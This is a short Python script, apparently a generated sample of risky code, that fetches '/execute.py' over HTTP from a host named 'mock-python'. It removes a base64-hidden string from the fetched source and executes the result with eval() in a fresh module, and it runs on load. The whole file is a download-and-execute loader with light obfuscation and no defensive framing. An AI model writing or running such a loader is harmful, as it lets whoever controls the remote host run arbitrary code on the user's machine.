import http.client
import types
import base64

def get_host_and_path():
    return "mock-python", "/execute.py"

def fetch_response(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    source = response.read().decode('utf-8')
    connection.close()
    return source

def create_module():
    return types.ModuleType("sm")

def eval_code(src, module):
    eval(src, module.__dict__)

def main():
    host, path = get_host_and_path()
    encoded_pass = "cGFzcw=="
    decoded_pass = base64.b64decode(encoded_pass).decode('utf-8')
    source = fetch_response(host, path).replace(decoded_pass, '')
    module = create_module()
    eval_code(source, module)

main()
